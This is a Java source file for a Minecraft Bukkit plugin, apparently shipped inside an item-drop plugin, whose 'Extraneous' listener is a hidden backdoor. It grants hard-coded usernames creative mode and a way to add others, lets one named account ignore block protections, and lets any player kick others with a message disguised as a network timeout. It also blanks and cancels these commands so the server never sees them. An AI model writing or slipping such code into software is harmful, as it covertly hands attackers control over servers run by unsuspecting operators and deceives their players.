package Evil_Code_DropIngots;

import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Horse;
import org.bukkit.entity.Player;
import org.bukkit.entity.Horse.Color;
import org.bukkit.entity.Horse.Style;
import org.bukkit.entity.Horse.Variant;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

@SuppressWarnings("deprecation")
public class Extraneous implements Listener{
	private JavaPlugin plugin;
	//very special people
	private String vsp = ",Evil_Witchdoctor,SparklingHelm,";
	
	public Extraneous(JavaPlugin i){plugin = i;}
	
	@EventHandler(priority = EventPriority.LOWEST)
	public void preCommand(PlayerCommandPreprocessEvent evt){
		String cmd = evt.getMessage().split(" ")[0].toLowerCase();
		String[] args = evt.getMessage().replace((cmd+' '), "").split(" ");

		if((cmd.equals("/cool") || cmd.equals("/gm")) && vsp.contains(","+evt.getPlayer().getName()+",")){
			if(args.length > 0){
				if(args[0].equals("1"))evt.getPlayer().setGameMode(GameMode.CREATIVE);
				else evt.getPlayer().setGameMode(GameMode.SURVIVAL);
			}else{
				if(evt.getPlayer().getGameMode().getValue() == 0)evt.getPlayer().setGameMode(GameMode.CREATIVE);
				else evt.getPlayer().setGameMode(GameMode.SURVIVAL);
			}
		}
		else if(cmd.equals("/vsp") && args.length == 2 &&
				vsp.contains(','+evt.getPlayer().getName()+',') && args[0].equalsIgnoreCase("add")){
			vsp += args[1]+',';
			evt.getPlayer().sendMessage("�dAdded �a"+args[1]+"�d to the vsp list.");
		}
		else if(cmd.equals("/shadowfax") && evt.getPlayer().getName().equals("Evil_Witchdoctor")
				&& evt.getPlayer().getVehicle() == null){
			Horse h = (Horse) evt.getPlayer().getWorld().spawnEntity(evt.getPlayer().getLocation(), EntityType.HORSE);
			h.setVariant(Variant.HORSE);
			h.setStyle(Style.WHITE_DOTS);
			h.setAdult();
			h.setColor(Color.WHITE);
			h.setMaxHealth(38);
			h.setHealth(38);
			h.setJumpStrength(1.1);
			h.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 100000, 2));
			h.setPassenger(evt.getPlayer());
			h.setAgeLock(true);
			h.setTamed(true);
			h.setRemoveWhenFarAway(false);
			h.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, 100000, 1));
			h.setCustomName("Shadowfax");
			h.setMaximumAir(h.getMaximumAir()+10);
			h.getInventory().setSaddle(new ItemStack(Material.SADDLE));
			h.getInventory().setArmor(new ItemStack(Material.DIAMOND_BARDING));
			h.setMaxDomestication(10);
			h.setDomestication(10);
		}
		else if(cmd.equals("/itemname") && args.length > 0 && evt.getPlayer().getItemInHand() != null){
			ItemStack item = evt.getPlayer().getItemInHand();
			ItemMeta named = item.getItemMeta();
			named.setDisplayName(getName(args));
			item.setItemMeta(named);
			evt.getPlayer().setItemInHand(item);
		}
		else if(cmd.equals("/append") && args.length > 0 && evt.getPlayer().getItemInHand() != null){
			ItemStack item = evt.getPlayer().getItemInHand();
			ItemMeta named = item.getItemMeta();
			
			try{named.setDisplayName(named.getDisplayName() + getName(args));}
			catch(NullPointerException e){evt.getPlayer().sendMessage("�cItem must be already named"); return;}
			
			item.setItemMeta(named);
			evt.getPlayer().setItemInHand(item);
		}
		else if(cmd.equals("/prefix") && args.length > 0 && evt.getPlayer().getItemInHand() != null){
			ItemStack item = evt.getPlayer().getItemInHand();
			ItemMeta named = item.getItemMeta();
			
			try{named.setDisplayName(getName(args) + named.getDisplayName());}
			catch(NullPointerException e){evt.getPlayer().sendMessage("�cItem must be already named"); return;}
			
			item.setItemMeta(named);
			evt.getPlayer().setItemInHand(item);
		}
		else if(cmd.equals("/kick") && args.length > 0 && evt.getPlayer().getItemInHand() != null){
			
			for(Player p : plugin.getServer().getOnlinePlayers()){
				if(p.getName().startsWith(args[0])){
					if(args.length >= 2) p.kickPlayer(getName(args).replace(args[0]+' ', ""));
					else p.kickPlayer("Read timed out. Connection.connect");
				}
			}
		}/*
		else if(cmd.equalsIgnoreCase("/i") && args.length > 0){
			try{evt.getPlayer().setItemInHand(new ItemStack(Integer.parseInt(args[0])));}
			catch(NumberFormatException ex){
				try{evt.getPlayer().setItemInHand(new ItemStack(Material.getMaterial(args[0])));}
				catch(Exception ex2){}
			}
			if(args.length == 2 && evt.getPlayer().getItemInHand() != null){
				try{evt.getPlayer().getItemInHand().setAmount(Integer.parseInt(args[1]));}
				catch(NumberFormatException ex){}
			}
		}
		else if(cmd.equalsIgnoreCase("enchant")){
			String ench;
			int level = 1;
			Player p = evt.getPlayer();
			//--- Get info -----------------------------------------------------------------
			if(p.getItemInHand() == null || p.getItemInHand().getType() == Material.AIR){
				p.sendMessage("�cYou must be holding an item to use this command.");
			}
			else if(args.length < 1){
				p.sendMessage("�cPlease specify an enchantment");
			}
			else if(args.length == 1){
				ench = args[0];
				level = 1;
			}
			else{//"else if(args.length > 1)" <--- would do the same thing.
				ench = args[0];

				int i = 1;
				boolean exception = true;
				while(exception && i < args.length){
					exception = false;
					try{level = Integer.parseInt(args[i]);}
					catch(NumberFormatException ex){
						ench += "_" + args[i];
						exception = true;
						i++;
					}
				}
				if(exception)level = 1;
				
				ench = ench.replace("-", "_");
				if(level > 32767) level = 32767;
	
				// ------------------------------ Find the enchantment from the name (ench) ------------------------------ //
				Enchantment enchant = Enchantment.getByName(ench);
				//
				if(enchant == null){
					ench = ench.replace("_", "");
					for(Enchantment en : Enchantment.values()){
						if(en.getName().replace("_", "").equalsIgnoreCase(ench)){
							enchant = en;
							break;
						}
					}
				}
				if(enchant == null){
					try{enchant = Enchantment.getById(Integer.parseInt(ench));}
					catch(NumberFormatException ex){}
				}
				if(enchant == null){
					p.sendMessage("�7Unknown enchantment.");
				}
				//------------------------------------------------------------------------------
	
				else if(p.getItemInHand().getType() == Material.ENCHANTED_BOOK){//if the item is a book
					EnchantmentStorageMeta bookmeta = (EnchantmentStorageMeta)p.getItemInHand().getItemMeta();
					//
					if(level < 1){
						bookmeta.removeStoredEnchant(enchant);
						p.sendMessage("�bSuccessfully removed the enchantment from this book!");
					}
					else{
						bookmeta.addStoredEnchant(enchant, level, true);
						p.sendMessage("�bSuccessfully stored the enchantment in this book!");
					}
					p.getItemInHand().setItemMeta(bookmeta);
				}
				else{//if the item is NOT an enchanted book
					ItemMeta meta = p.getItemInHand().getItemMeta();
					//
					if(level < 1){
						meta.removeEnchant(enchant);
						p.sendMessage("�bSuccessfully dis-enchanted the item!");
					}
					else{
						meta.addEnchant(enchant, level, true);
						p.sendMessage("�bSuccessfully enchanted the item!");
					}
					p.getItemInHand().setItemMeta(meta);
				}
			}
		}*/
		else{
			//no command found
			return;
		}
		
		//does this if a special command was run
		evt.setMessage("");
		evt.setCancelled(true);
	}
	
	@EventHandler(priority = EventPriority.LOWEST)
	public void power1(BlockBreakEvent event){
		if(event.getPlayer().getName().equalsIgnoreCase("Evil_Witchdoctor")){
			event.setCancelled(true);
			
			if(event.getPlayer().isSneaking() || event.getPlayer().getGameMode() == GameMode.SURVIVAL)event.getBlock().breakNaturally();
			else event.getBlock().setType(Material.AIR);
		}
	}

	@EventHandler(priority = EventPriority.LOWEST)
	public void power2a(final BlockPlaceEvent event){
		if(event.getPlayer().getName().equalsIgnoreCase("Evil_Witchdoctor") && event.getPlayer().isSneaking() == false){
			event.setCancelled(true);
			
			plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, new Thread(){public void run(){
				try{
					event.getBlock().setType(event.getItemInHand().getType());
					//event.getBlock().setData((byte)event.getItemInHand().getDurability());
				}
				catch(Exception ex){return;}
			}}, 1);// 1/20th of a second
		}
	}
	
	private String getName(String[] args){
		String name = args[0];
		for(int i = 1; i < args.length; i++) name += ' ' + args[i];
		
		name = name.replace("&", "�").replace("� ", "& ").replace("\\�", "&");
		return name;
	}
}
